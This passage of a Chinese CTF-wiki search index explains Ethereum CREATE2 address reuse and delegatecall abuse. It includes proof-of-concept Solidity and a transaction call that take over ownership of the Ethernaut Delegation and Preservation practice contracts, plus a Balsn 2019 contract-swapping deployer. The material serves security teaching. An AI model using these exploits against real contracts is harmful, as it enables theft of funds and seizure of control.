\u4e2d\u6700\u5e38\u89c1\u7684\u5c31\u662f\u5229\u7528\u8fd9\u79cd\u53ef\u63a7\u6027\uff0c\u5728\u540c\u4e00\u4e2a\u5730\u5740\u5148\u540e\u90e8\u7f72\u5b57\u8282\u7801\u5b8c\u5168\u4e0d\u540c\u7684\u5408\u7ea6\u3002","title":"CREATE2"},{"location":"blockchain/ethereum/attacks/create2/#_1","text":"","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/create2/#create","text":"\u5982\u679c\u5229\u7528\u5916\u90e8\u8d26\u6237\u6216\u8005\u4f7f\u7528 CREATE \u64cd\u4f5c\u7801\u7684\u5408\u7ea6\u8d26\u6237\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c\u90a3\u4e48\u5f88\u5bb9\u6613\u5c31\u80fd\u786e\u5b9a\u88ab\u521b\u5efa\u5408\u7ea6\u7684\u5730\u5740\u3002\u6bcf\u4e2a\u8d26\u6237\u90fd\u6709\u4e00\u4e2a\u4e0e\u4e4b\u5173\u8054\u7684 nonce \uff1a\u5bf9\u5916\u90e8\u8d26\u6237\u800c\u8a00\uff0c\u6bcf\u53d1\u9001\u4e00\u4e2a\u4ea4\u6613\uff0c nonce \u5c31\u4f1a\u968f\u4e4b +1 \uff1b\u5bf9\u5408\u7ea6\u8d26\u6237\u800c\u8a00\uff0c\u6bcf\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c nonce \u5c31\u4f1a\u968f\u4e4b +1 \u3002\u65b0\u5408\u7ea6\u7684\u5730\u5740\u7531\u521b\u5efa\u5408\u7ea6\u4ea4\u6613\u7684\u53d1\u9001\u8005\u8d26\u6237\u5730\u5740\u53ca\u5176 nonce \u503c\u8ba1\u7b97\u5f97\u5230\uff0c\u5176\u5177\u4f53\u516c\u5f0f\u5982\u4e0b\uff1a keccak256 ( rlp . encode ( address , nonce ))[ 12 :]","title":"CREATE"},{"location":"blockchain/ethereum/attacks/create2/#create2_1","text":"\u4e0d\u540c\u4e8e\u539f\u6765\u7684 CREATE \u64cd\u4f5c\u7801\uff0c\u5728\u5408\u7ea6\u5730\u5740\u7684\u8ba1\u7b97\u65b9\u6cd5\u4e0a\uff0c CREATE2 \u4e0d\u518d\u4f9d\u8d56\u4e8e\u8d26\u6237\u7684 nonce \uff0c\u800c\u662f\u5bf9\u4ee5\u4e0b\u53c2\u6570\u8fdb\u884c\u54c8\u5e0c\u8ba1\u7b97\uff0c\u5f97\u51fa\u65b0\u7684\u5730\u5740\uff1a \u5408\u7ea6\u521b\u5efa\u8005\u7684\u5730\u5740\uff08 address ) \u4f5c\u4e3a\u53c2\u6570\u7684\u6df7\u6dc6\u503c\uff08 salt \uff09 \u5408\u7ea6\u521b\u5efa\u4ee3\u7801 ( init_code ) \u5177\u4f53\u7684\u8ba1\u7b97\u516c\u5f0f\u5982\u4e0b\uff1a keccak256 ( 0xff ++ address ++ salt ++ keccak256 ( init_code ))[ 12 :] \u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u91cd\u8981\u7ec6\u8282\u662f\uff0c\u8ba1\u7b97\u5408\u7ea6\u5730\u5740\u6240\u9700\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u5e76\u975e\u5408\u7ea6\u4ee3\u7801\uff0c\u800c\u662f\u5176\u521b\u5efa\u4ee3\u7801\u3002\u8be5\u4ee3\u7801\u662f\u7528\u6765\u521b\u5efa\u5408\u7ea6\u7684\uff0c\u5408\u7ea6\u521b\u5efa\u5b8c\u6210\u540e\u5c06\u8fd4\u56de\u8fd0\u884c\u65f6\u5b57\u8282\u7801\u3002 \u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u6211\u4eec\u63a7\u5236\u4e86\u5408\u7ea6\u7684\u521b\u5efa\u4ee3\u7801\u5e76\u4f7f\u5176\u4fdd\u6301\u4e0d\u53d8\uff0c\u7136\u540e\u63a7\u5236\u5408\u7ea6\u6784\u9020\u51fd\u6570\u8fd4\u56de\u7684\u8fd0\u884c\u65f6\u5b57\u8282\u7801\uff0c\u90a3\u4e48\u6211\u4eec\u5f88\u5bb9\u6613\u5c31\u80fd\u505a\u5230\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u53cd\u590d\u90e8\u7f72\u5b8c\u5168\u4e0d\u540c\u7684\u5408\u7ea6\u3002\u4e8b\u5b9e\u4e0a CREATE2 \u8fd9\u79cd\u8ba9\u5408\u7ea6\u5728\u90e8\u7f72\u540e\u53ef\u4ee5\u88ab\u91cd\u65b0\u66f4\u6539\u7684\u7279\u6027\u5b58\u5728\u7740\u6f5c\u5728\u7684\u5b89\u5168\u95ee\u9898\uff0c\u4e5f\u5f15\u8d77\u4e86\u4eba\u4eec\u5bf9\u5176\u7684 \u8ba8\u8bba \u3002 \u5728 CTF \u4e2d\uff0c\u8fd9\u79cd\u7279\u6027\u5f80\u5f80\u4f1a\u88ab\u7528\u6765\u4f5c\u4e3a\u4e00\u4e2a\u6280\u5de7\uff0c\u901a\u8fc7\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\u90e8\u7f72\u4e0d\u540c\u7684\u5408\u7ea6\u7528\u6765 bypass \u4e0d\u540c\u7684\u6821\u9a8c\u3002","title":"CREATE2"},{"location":"blockchain/ethereum/attacks/create2/#_2","text":"\u4ee5 2019 Balsn CTF \u7684 Creativity \u7684 WP \u63d0\u4f9b\u7684 PoC \u4f5c\u4e3a\u4f8b\u5b50\uff0c\u8bb2\u89e3\u4e00\u4e0b CREATE2 \u7684\u5de7\u5999\u4f7f\u7528\uff1a pragma solidity ^ 0.5.10 ; contract Deployer { bytes public deployBytecode ; address public deployedAddr ; function deploy ( bytes memory code ) public { deployBytecode = code ; address a ; // Compile Dumper to get this bytecode bytes memory dumperBytecode = hex '6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe' ; assembly { a : = create2 ( callvalue , add ( 0x20 , dumperBytecode ), mload ( dumperBytecode ), 0x9453 ) } deployedAddr = a ; } } contract Dumper { constructor () public { Deployer dp = Deployer ( msg.sender ); bytes memory bytecode = dp . deployBytecode (); assembly { return ( add ( bytecode , 0x20 ), mload ( bytecode )) } } } \u5f53\u6211\u4eec\u6bcf\u6b21\u5229\u7528 deploy(code) \u51fd\u6570\u6765\u90e8\u7f72\u9884\u671f\u6784\u9020\u7684\u5408\u7ea6\u65f6\uff0c\u7531\u4e8e\u5b9e\u9645\u4e0a\u7684 init_code \u90fd\u662f\u540c\u6837\u7684 dumperBytecode \uff0c\u518d\u52a0\u4e0a\u786e\u5b9a\u7684\u5408\u7ea6\u5730\u5740\u4ee5\u53ca salt \uff0c\u6240\u4ee5\u901a\u8fc7 deploy(code) \u90e8\u7f72\u7684\u5408\u7ea6\u6700\u7ec8\u4f1a\u90e8\u7f72\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\u3002\u7136\u540e\u88ab\u52a0\u8f7d\u7684\u5408\u7ea6\u5728\u6784\u9020\u51fd\u6570\u6267\u884c\u7684\u65f6\u5019\uff0c\u4f1a\u8df3\u8f6c\u5230\u8c03\u7528\u51fd\u6570\u65f6\u4f20\u5165\u7684 code \u4e0a\uff0c\u6240\u4ee5\u4e0d\u7ba1\u6211\u4eec\u7528 deploy(code) \u51fd\u6570\u90e8\u7f72\u4ec0\u4e48\u5408\u7ea6\uff0c\u5176\u6700\u7ec8\u90fd\u4f1a\u90e8\u7f72\u5230\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\u3002 \u5728\u77e5\u9053 Deployer \u5408\u7ea6\u5730\u5740\u662f 0x99Ed0b4646a5F4Ee0877B8341E9629e4BF30c281 \u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u90e8\u7f72\u5408\u7ea6\u7684\u5730\u5740\u4e3a 0x4315DBef1aC19251d54b075d29Bcc4E81F1e3C73\uff1a function getAddress ( address addr , bytes memory bytecode , uint salt ) public view returns ( address ) { bytes32 hash = keccak256 ( abi . encodePacked ( bytes1 ( 0xff ), addr , salt , keccak256 ( bytecode ) ) ); // NOTE: cast last 20 bytes of hash to address return address ( uint160 ( uint256 ( hash ))); } \u5229\u7528\u8be5\u5408\u7ea6\uff0c\u6211\u4eec\u6210\u529f\u5730\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\u5148\u540e\u4e0a\u90e8\u7f72\u4e86\u4e24\u4e2a\u4e0d\u540c\u7684\u5408\u7ea6\uff1a","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/attacks/create2/#_3","text":"","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/create2/#balsn-2019","text":"\u9898\u76ee\u540d\u79f0 Creativity","title":"Balsn 2019"},{"location":"blockchain/ethereum/attacks/create2/#qwb-2020","text":"\u9898\u76ee\u540d\u79f0 EasyAssembly","title":"QWB 2020"},{"location":"blockchain/ethereum/attacks/create2/#_4","text":"EIP-1014: Skinny CREATE2 \u5145\u5206\u5229\u7528 CREATE2 Balsn CTF 2019 - Creativity","title":"\u53c2\u8003"},{"location":"blockchain/ethereum/attacks/delegatecall/","text":"Delegatecall \u00b6 There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values. \u539f\u7406 \u00b6 \u4e09\u79cd\u8c03\u7528\u51fd\u6570 \u00b6 \u5728 Solidity \u4e2d\uff0ccall \u51fd\u6570\u7c07\u53ef\u4ee5\u5b9e\u73b0\u8de8\u5408\u7ea6\u7684\u51fd\u6570\u8c03\u7528\u529f\u80fd\uff0c\u5176\u4e2d\u5305\u62ec call\u3001delegatecall \u548c callcode \u4e09\u79cd\u65b9\u5f0f\u3002 \u8c03\u7528\u6a21\u578b \u00b6 <address>.call(...) returns (bool) <address>.callcode(...) returns (bool) <address>.delegatecall(...) returns (bool) \u8fd9\u4e9b\u51fd\u6570\u63d0\u4f9b\u4e86\u7075\u6d3b\u7684\u65b9\u5f0f\u4e0e\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92\uff0c\u5e76\u4e14\u53ef\u4ee5\u63a5\u53d7\u4efb\u4f55\u957f\u5ea6\u3001\u4efb\u4f55\u7c7b\u578b\u7684\u53c2\u6570\uff0c\u5176\u4f20\u5165\u7684\u53c2\u6570\u4f1a\u88ab\u586b\u5145\u81f3 32 \u5b57\u8282\u6700\u540e\u62fc\u63a5\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\u5e8f\u5217\uff0c\u7531 EVM \u89e3\u6790\u6267\u884c\u3002 \u5728\u51fd\u6570\u8c03\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cSolidity \u4e2d\u7684\u5185\u7f6e\u53d8\u91cf msg \u4f1a\u968f\u7740\u8c03\u7528\u7684\u53d1\u8d77\u800c\u6539\u53d8\uff0c msg \u4fdd\u5b58\u4e86\u8c03\u7528\u65b9\u7684\u4fe1\u606f\u5305\u62ec\uff1a\u8c03\u7528\u53d1\u8d77\u7684\u5730\u5740\uff0c\u4ea4\u6613\u91d1\u989d\uff0c\u88ab\u8c03\u7528\u51fd\u6570\u5b57\u7b26\u5e8f\u5217\u7b49\u3002 \u5f02\u540c\u70b9 \u00b6 call: \u8c03\u7528\u540e\u5185\u7f6e\u53d8\u91cf msg \u7684\u503c\u4f1a\u4fee\u6539\u4e3a\u8c03\u7528\u8005\uff0c\u6267\u884c\u73af\u5883\u4e3a\u88ab\u8c03\u7528\u8005\u7684\u8fd0\u884c\u73af\u5883 delegatecall: \u8c03\u7528\u540e\u5185\u7f6e\u53d8\u91cf msg \u7684\u503c\u4e0d\u4f1a\u4fee\u6539\u4e3a\u8c03\u7528\u8005\uff0c\u4f46\u6267\u884c\u73af\u5883\u4e3a\u8c03\u7528\u8005\u7684\u8fd0\u884c\u73af\u5883\uff08\u76f8\u5f53\u4e8e\u590d\u5236\u88ab\u8c03\u7528\u8005\u7684\u4ee3\u7801\u5230\u8c03\u7528\u8005\u5408\u7ea6\uff09 callcode: \u8c03\u7528\u540e\u5185\u7f6e\u53d8\u91cf msg \u7684\u503c\u4f1a\u4fee\u6539\u4e3a\u8c03\u7528\u8005\uff0c\u4f46\u6267\u884c\u73af\u5883\u4e3a\u8c03\u7528\u8005\u7684\u8fd0\u884c\u73af\u5883 Note Warning: \"callcode\" has been deprecated in favour of \"delegatecall\" Delegatecall \u6ee5\u7528 \u00b6 \u8bbe\u8ba1\u521d\u8877 \u00b6 \u51fd\u6570\u539f\u578b <address>.delegatecall(...) returns (bool) \u51fd\u6570\u8bbe\u8ba1\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u4f7f\u7528\u7ed9\u5b9a\u5730\u5740\u7684\u4ee3\u7801\uff0c\u5176\u4ed6\u4fe1\u606f\u5219\u4f7f\u7528\u5f53\u524d\u5408\u7ea6\uff08\u5982\u5b58\u50a8\u3001\u4f59\u989d\u7b49\uff09 \u67d0\u79cd\u7a0b\u5ea6\u4e0a\u4e5f\u662f\u4e3a\u4e86\u4ee3\u7801\u7684\u590d\u7528 \u5a01\u80c1\u5206\u6790 \u00b6 \u53c2\u8003\u51fd\u6570\u539f\u578b\uff0c\u6211\u4eec\u77e5\u9053\uff0cdelegatecall \u8c03\u7528\u6709 address \u548c msg.data \u4e24\u4e2a\u53c2\u6570 \u82e5 msg.data \u53ef\u63a7\uff0c\u5219\u53ef\u8c03\u7528 address \u5904\u4efb\u610f\u51fd\u6570 pragma solidity ^ 0.4.18 ; contract Delegate { address public owner ; function Delegate ( address _owner ) public { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; function Delegation ( address _delegateAddress ) public { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } function () public { if ( delegate . delegatecall ( msg.data )) { this ; } } } \u5bf9\u4e8e\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u653b\u51fb\u8005\u5982\u4f55\u6210\u4e3a owner \u5462\uff1f \u5176\u5b9e\u6211\u4eec\u53ea\u9700\u8c03\u7528 Delegation \u7684\u5047 pwn() \u5373\u53ef\uff0c\u8fd9\u6837\u5c31\u4f1a\u89e6\u53d1 Delegation \u7684 fallback \uff0c\u8fd9\u6837 pwn \u7684\u51fd\u6570\u7b7e\u540d\u54c8\u5e0c\u5c31\u4f1a\u653e\u5728 msg.data[0:4] \u4e86\uff0c\u8fd9\u6837\u5c31\u4f1a\u53ea\u9700 delegate \u7684 pwn() \u628a owner \u53d8\u6210\u81ea\u5df1\uff0c\u5982\u4e0b\u6240\u793a\u5373\u53ef\uff08\u8fd9\u5c31\u662f\u56e0\u4e3a msg.data \u53ef\u63a7\u5bfc\u81f4\u7684\uff09 contract.sendTransaction({data: web3.sha3(\"pwn()\").slice(0,10)}) \u82e5 msg.data \u548c address \u90fd\u53ef\u63a7\uff0c\u5219\u53ef\u8c03\u7528\u4efb\u610f address \u5904\u7684\u4efb\u610f\u51fd\u6570 \u540c\u7406\uff0c\u53ea\u4e0d\u8fc7\u989d\u5916\u52a0\u4e86 address \u662f\u53ef\u63a7\u7684\u8fd9\u4e2a\u6761\u4ef6\uff0c\u4e0d\u518d\u4f5c\u5206\u6790 \u539f\u56e0\u5206\u6790 \u00b6 pragma solidity ^ 0.4.23 ; contract A { address public c ; address public b ; function test () public returns ( address a ) { a = address ( this ); b = a ; } } contract B { address public b ; address public c ; function withdelegatecall ( address testaddress ) public { testaddress . delegatecall ( bytes4 ( keccak256 ( \"test()\" ))); } } \u6765\u770b\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u5047\u8bbe\u5408\u7ea6 A \u90e8\u7f72\u540e\u5730\u5740\u4e3a address_a\uff0c\u5408\u7ea6 B \u90e8\u7f72\u540e\u5730\u5740\u4e3a address_b\uff0c\u4f7f\u7528 \u5916\u90e8\u8d26\u6237 C \u8c03\u7528 withdelegatecall(address_a)\uff0caddress_a \u548c address_b \u4e2d\u7684 b\u3001c \u53d8\u91cf\u5206\u522b\u662f\u591a\u5c11\uff1f\u7ed3\u679c\u5982\u4e0b address_a \u5408\u7ea6\u4e2d\uff0cc = 0\uff0cb = 0\uff1baddress_b \u5408\u7ea6\u4e2d\uff0cb = 0\uff0cc = address_b \u4fee\u6539\u7684\u4e0d\u662f B \u5408\u7ea6\u4e2d\u7684 b \u53d8\u91cf\uff0c\u800c\u662f\u4fee\u6539\u4e86 B \u5408\u7ea6\u4e2d\u7684 c \u53d8\u91cf sstore \u5373\u8bbf\u5b58\u6307\u4ee4\uff0c\u53ef\u4ee5\u770b\u5230\u5199\u5165\u7684\u662f 1 \u53f7\u5b58\u50a8\u4f4d\uff0c1\u53f7\u5b58\u50a8\u4f4d \u5728 B \u5408\u7ea6\u4e2d\u5373\u5bf9\u5e94\u53d8\u91cf c\uff0c\u5728 A \u5408\u7ea6\u4e2d\u5219\u5bf9\u5e94\u53d8\u91cf b\uff0c\u6240\u4ee5\u4e8b\u5b9e\u4e0a\u8c03\u7528 delegatecall \u6765\u4f7f\u7528 Storage \u53d8\u91cf\u65f6\u4f9d\u636e\u5e76\u4e0d\u662f\u53d8\u91cf\u540d\uff0c\u800c\u662f\u53d8\u91cf\u7684\u5b58\u50a8\u4f4d\uff0c\u8fd9\u6837\u7684\u8bdd\u6211\u4eec\u5c31\u53ef\u4ee5\u8fbe\u5230\u8986\u76d6\u76f8\u5173\u53d8\u91cf\u7684\u76ee\u7684\u3002 \u4f8b\u5b50 \u00b6 Source \u00b6 ethernaut \u7b2c 16 \u9898 Analyse \u00b6 \u6211\u4eec\u8c03\u7528 Preservation \u7684 setFirstTime \u51fd\u6570\u5b9e\u9645\u901a\u8fc7 delegatecall \u6267\u884c\u4e86 LibraryContract \u7684 setTime \u51fd\u6570\uff0c\u4fee\u6539\u4e86 slot 1 \uff0c\u4e5f\u5c31\u662f\u4fee\u6539\u4e86 timeZone1Library \u53d8\u91cf \u8fd9\u6837\uff0c\u6211\u4eec\u7b2c\u4e00\u6b21\u8c03\u7528 setFirstTime \u5c06 timeZone1Library \u53d8\u91cf\u4fee\u6539\u4e3a\u6211\u4eec\u7684\u6076\u610f\u5408\u7ea6\u7684\u5730\u5740\uff0c\u7b2c\u4e8c\u6b21\u8c03\u7528 setFirstTime \u5c31\u53ef\u4ee5\u6267\u884c\u6211\u4eec\u7684\u4efb\u610f\u4ee3\u7801\u4e86 Exp \u00b6 pragma solidity ^ 0.4.23 ; contract Preservation { // public library contracts address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4 ( keccak256 ( \"setTime(uint256)\" )); constructor ( address _timeZone1LibraryAddress , address _timeZone2LibraryAddress ) public { timeZone1Library = _timeZone1LibraryAddress ; timeZone2Library = _timeZone2LibraryAddress ; owner = msg.sender ; } // set the time for timezone 1 function setFirstTime ( uint _timeStamp ) public { timeZone1Library . delegatecall ( setTimeSignature , _timeStamp ); } // set the time for timezone 2 function setSecondTime ( uint _timeStamp ) public { timeZone2Library . delegatecall ( setTimeSignature , _timeStamp ); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp uint storedTime ; function setTime ( uint _time ) public { storedTime = _time ; } } contract attack { address public timeZone1Library ; address public timeZone2Library ; address public owner ; address instance_address = 0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c ; Preservation target = Preservation ( instance_address ); function attack1 () { target . setFirstTime ( uint ( address ( this ))); } function attack2 () { target . setFirstTime ( uint ( 0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2 )); } function setTime ( uint _time ) public { timeZone1Library = address ( _time ); timeZone2Library = address ( _time ); owner = address ( _time ); } } \u5148\u8c03\u7528 attack1() \uff0c\u518d\u8c03\u7528 attack2() \u5373\u53ef Result \u00b6 \u9898\u76ee \u00b6 RealWorld 2018 \u00b6 \u9898\u76ee\u540d\u79f0 Acoraida Monica Balsn 2019 \u00b6 \u9898\u76ee\u540d\u79f0 Creativity \u7b2c\u4e94\u7a7a\u95f4 2020 \u00b6 \u9898\u76ee\u540d\u79f0 SafeDelegatecall \u534e\u4e3a\u9cb2\u9e4f\u8ba1\u7b97 2020 \u00b6 \u9898\u76ee\u540d\u79f0 boxgame Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"Delegatecall"},{"location":"blockchain/ethereum/attacks/delegatecall/#delegatecall","text":"There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.","title":"Delegatecall"},{"location":"blockchain/ethereum/attacks/delegatecall/#_1","text":"","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/delegatecall/#_2","text":"\u5728 Solidity \u4e2d\uff0ccall \u51fd\u6570\u7c07\u53ef\u4ee5\u5b9e\u73b0\u8de8\u5408\u7ea6\u7684\u51fd\u6570\u8c03\u7528\u529f\u80fd\uff0c\u5176\u4e2d\u5305\u62ec call\u3001delegatecall \u548c callcode \u4e09\u79cd\u65b9\u5f0f\u3002","title":"\u4e09\u79cd\u8c03\u7528\u51fd\u6570"},{"location":"blockchain/ethereum/attacks/delegatecall/#_3","text":"<address>.call(...) returns (bool) <address>.callcode(...) returns (bool) <address>.delegatecall(...) returns (bool) \u8fd9\u4e9b\u51fd\u6570\u63d0\u4f9b\u4e86\u7075\u6d3b\u7684\u65b9\u5f0f\u4e0e\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92\uff0c\u5e76\u4e14\u53ef\u4ee5\u63a5\u53d7\u4efb\u4f55\u957f\u5ea6\u3001\u4efb\u4f55\u7c7b\u578b\u7684\u53c2\u6570\uff0c\u5176\u4f20\u5165\u7684\u53c2\u6570\u4f1a\u88ab\u586b\u5145\u81f3 32 \u5b57\u8282\u6700\u540e\u62fc\u63a5\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\u5e8f\u5217\uff0c\u7531 EVM \u89e3\u6790\u6267\u884c\u3002 \u5728\u51fd\u6570\u8c03\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cSolidity \u4e2d\u7684\u5185\u7f6e\u53d8\u91cf msg \u4f1a\u968f\u7740\u8c03\u7528\u7684\u53d1\u8d77\u800c\u6539\u53d8\uff0c msg \u4fdd\u5b58\u4e86\u8c03\u7528\u65b9\u7684\u4fe1\u606f\u5305\u62ec\uff1a\u8c03\u7528\u53d1\u8d77\u7684\u5730\u5740\uff0c\u4ea4\u6613\u91d1\u989d\uff0c\u88ab\u8c03\u7528\u51fd\u6570\u5b57\u7b26\u5e8f\u5217\u7b49\u3002","title":"\u8c03\u7528\u6a21\u578b"},{"location":"blockchain/ethereum/attacks/delegatecall/#_4","text":"call: \u8c03\u7528\u540e\u5185\u7f6e\u53d8\u91cf msg \u7684\u503c\u4f1a\u4fee\u6539\u4e3a\u8c03\u7528\u8005\uff0c\u6267\u884c\u73af\u5883\u4e3a\u88ab\u8c03\u7528\u8005\u7684\u8fd0\u884c\u73af\u5883 delegatecall: \u8c03\u7528\u540e\u5185\u7f6e\u53d8\u91cf msg \u7684\u503c\u4e0d\u4f1a\u4fee\u6539\u4e3a\u8c03\u7528\u8005\uff0c\u4f46\u6267\u884c\u73af\u5883\u4e3a\u8c03\u7528\u8005\u7684\u8fd0\u884c\u73af\u5883\uff08\u76f8\u5f53\u4e8e\u590d\u5236\u88ab\u8c03\u7528\u8005\u7684\u4ee3\u7801\u5230\u8c03\u7528\u8005\u5408\u7ea6\uff09 callcode: \u8c03\u7528\u540e\u5185\u7f6e\u53d8\u91cf msg \u7684\u503c\u4f1a\u4fee\u6539\u4e3a\u8c03\u7528\u8005\uff0c\u4f46\u6267\u884c\u73af\u5883\u4e3a\u8c03\u7528\u8005\u7684\u8fd0\u884c\u73af\u5883 Note Warning: \"callcode\" has been deprecated in favour of \"delegatecall\"","title":"\u5f02\u540c\u70b9"},{"location":"blockchain/ethereum/attacks/delegatecall/#delegatecall_1","text":"","title":"Delegatecall \u6ee5\u7528"},{"location":"blockchain/ethereum/attacks/delegatecall/#_5","text":"\u51fd\u6570\u539f\u578b <address>.delegatecall(...) returns (bool) \u51fd\u6570\u8bbe\u8ba1\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u4f7f\u7528\u7ed9\u5b9a\u5730\u5740\u7684\u4ee3\u7801\uff0c\u5176\u4ed6\u4fe1\u606f\u5219\u4f7f\u7528\u5f53\u524d\u5408\u7ea6\uff08\u5982\u5b58\u50a8\u3001\u4f59\u989d\u7b49\uff09 \u67d0\u79cd\u7a0b\u5ea6\u4e0a\u4e5f\u662f\u4e3a\u4e86\u4ee3\u7801\u7684\u590d\u7528","title":"\u8bbe\u8ba1\u521d\u8877"},{"location":"blockchain/ethereum/attacks/delegatecall/#_6","text":"\u53c2\u8003\u51fd\u6570\u539f\u578b\uff0c\u6211\u4eec\u77e5\u9053\uff0cdelegatecall \u8c03\u7528\u6709 address \u548c msg.data \u4e24\u4e2a\u53c2\u6570 \u82e5 msg.data \u53ef\u63a7\uff0c\u5219\u53ef\u8c03\u7528 address \u5904\u4efb\u610f\u51fd\u6570 pragma solidity ^ 0.4.18 ; contract Delegate { address public owner ; function Delegate ( address _owner ) public { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; function Delegation ( address _delegateAddress ) public { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } function () public { if ( delegate . delegatecall ( msg.data )) { this ; } } } \u5bf9\u4e8e\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u653b\u51fb\u8005\u5982\u4f55\u6210\u4e3a owner \u5462\uff1f \u5176\u5b9e\u6211\u4eec\u53ea\u9700\u8c03\u7528 Delegation \u7684\u5047 pwn() \u5373\u53ef\uff0c\u8fd9\u6837\u5c31\u4f1a\u89e6\u53d1 Delegation \u7684 fallback \uff0c\u8fd9\u6837 pwn \u7684\u51fd\u6570\u7b7e\u540d\u54c8\u5e0c\u5c31\u4f1a\u653e\u5728 msg.data[0:4] \u4e86\uff0c\u8fd9\u6837\u5c31\u4f1a\u53ea\u9700 delegate \u7684 pwn() \u628a owner \u53d8\u6210\u81ea\u5df1\uff0c\u5982\u4e0b\u6240\u793a\u5373\u53ef\uff08\u8fd9\u5c31\u662f\u56e0\u4e3a msg.data \u53ef\u63a7\u5bfc\u81f4\u7684\uff09 contract.sendTransaction({data: web3.sha3(\"pwn()\").slice(0,10)}) \u82e5 msg.data \u548c address \u90fd\u53ef\u63a7\uff0c\u5219\u53ef\u8c03\u7528\u4efb\u610f address \u5904\u7684\u4efb\u610f\u51fd\u6570 \u540c\u7406\uff0c\u53ea\u4e0d\u8fc7\u989d\u5916\u52a0\u4e86 address \u662f\u53ef\u63a7\u7684\u8fd9\u4e2a\u6761\u4ef6\uff0c\u4e0d\u518d\u4f5c\u5206\u6790","title":"\u5a01\u80c1\u5206\u6790"},{"location":"blockchain/ethereum/attacks/delegatecall/#_7","text":"pragma solidity ^ 0.4.23 ; contract A { address public c ; address public b ; function test () public returns ( address a ) { a = address ( this ); b = a ; } } contract B { address public b ; address public c ; function withdelegatecall ( address testaddress ) public { testaddress . delegatecall ( bytes4 ( keccak256 ( \"test()\" ))); } } \u6765\u770b\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u5047\u8bbe\u5408\u7ea6 A \u90e8\u7f72\u540e\u5730\u5740\u4e3a address_a\uff0c\u5408\u7ea6 B \u90e8\u7f72\u540e\u5730\u5740\u4e3a address_b\uff0c\u4f7f\u7528 \u5916\u90e8\u8d26\u6237 C \u8c03\u7528 withdelegatecall(address_a)\uff0caddress_a \u548c address_b \u4e2d\u7684 b\u3001c \u53d8\u91cf\u5206\u522b\u662f\u591a\u5c11\uff1f\u7ed3\u679c\u5982\u4e0b address_a \u5408\u7ea6\u4e2d\uff0cc = 0\uff0cb = 0\uff1baddress_b \u5408\u7ea6\u4e2d\uff0cb = 0\uff0cc = address_b \u4fee\u6539\u7684\u4e0d\u662f B \u5408\u7ea6\u4e2d\u7684 b \u53d8\u91cf\uff0c\u800c\u662f\u4fee\u6539\u4e86 B \u5408\u7ea6\u4e2d\u7684 c \u53d8\u91cf sstore \u5373\u8bbf\u5b58\u6307\u4ee4\uff0c\u53ef\u4ee5\u770b\u5230\u5199\u5165\u7684\u662f 1 \u53f7\u5b58\u50a8\u4f4d\uff0c1\u53f7\u5b58\u50a8\u4f4d \u5728 B \u5408\u7ea6\u4e2d\u5373\u5bf9\u5e94\u53d8\u91cf c\uff0c\u5728 A \u5408\u7ea6\u4e2d\u5219\u5bf9\u5e94\u53d8\u91cf b\uff0c\u6240\u4ee5\u4e8b\u5b9e\u4e0a\u8c03\u7528 delegatecall \u6765\u4f7f\u7528 Storage 